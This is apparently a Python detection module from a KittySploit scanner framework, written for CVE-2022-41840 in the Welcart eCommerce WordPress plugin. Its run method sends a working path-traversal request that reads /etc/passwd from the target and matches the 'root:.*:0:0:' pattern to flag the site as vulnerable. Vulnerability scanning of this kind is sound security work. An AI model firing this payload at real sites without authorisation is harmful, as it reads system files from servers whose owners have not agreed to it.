#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Welcart eCommerce 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Welcart eCommerce <=2.7.7 - Local File Inclusion Detection',
        'description': 'Welcart eCommerce 2.7.7 and before are vulnerable to unauthenticated local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp-plugin', 'wordpress', 'wp', 'lfi', 'unauth', 'usc-e-shop', 'collne', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://patchstack.com/database/vulnerability/usc-e-shop/wordpress-welcart-e-commerce-plugin-2-7-7-unauth-directory-traversal-vulnerability',
            'https://wordpress.org/plugins/usc-e-shop/',
            'https://patchstack.com/database/vulnerability/usc-e-shop/wordpress-welcart-e-commerce-plugin-2-7-7-unauth-directory-traversal-vulnerability?_s_id=cve',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-41840',
        ],
        'cve': 'CVE-2022-41840',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Welcart eCommerce <=2.7.7 - Local File Inclusion detected",
                path='/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

